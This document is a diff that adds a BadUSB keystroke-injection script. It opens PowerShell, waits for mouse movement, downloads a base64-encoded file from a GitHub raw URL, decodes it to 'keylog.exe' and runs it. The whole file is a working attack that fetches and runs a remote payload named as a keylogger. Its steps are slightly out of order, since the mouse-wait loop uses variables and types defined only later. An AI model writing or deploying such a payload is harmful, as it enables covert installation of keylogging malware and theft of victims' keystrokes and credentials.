@@ -1,0 +1,41 @@
+REM Open PowerShell
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+
+REM Enter a PowerShell loop that waits for mouse movement to continue
+STRING While($true){$p=[System.Windows.Forms.Cursor]::Position;if($p.X -ne $startPos.X -or $p.Y -ne $startPos.Y){break};Start-Sleep -Milliseconds 500;$startPos=[System.Windows.Forms.Cursor]::Position}
+ENTER
+DELAY 500
+
+REM Add necessary .NET assembly for accessing forms components
+STRING Add-Type -AssemblyName System.Windows.Forms
+ENTER
+DELAY 500
+
+REM Set initial mouse position
+STRING $startPos=[System.Windows.Forms.Cursor]::Position
+ENTER
+DELAY 500
+
+REM Download encoded executable
+STRING $url='https://raw.githubusercontent.com/Chrislundh98/BadUSB/main/MsgBox-Spam/encoded-20240309134233.txt'; $out='encoded-20240309134233.txt'; Invoke-WebRequest -Uri $url -OutFile $out
+ENTER
+DELAY 1000
+
+REM Decode the file and save as .exe
+STRING $data=Get-Content -Path encoded-20240309134233.txt; $decoded=[System.Convert]::FromBase64String($data); [System.IO.File]::WriteAllBytes('keylog.exe', $decoded)
+ENTER
+DELAY 1000
+
+REM Execute the decoded .exe file
+STRING Start-Process -FilePath .\keylog.exe
+ENTER
+DELAY 500
+
+REM Close PowerShell
+STRING exit
+ENTER
+
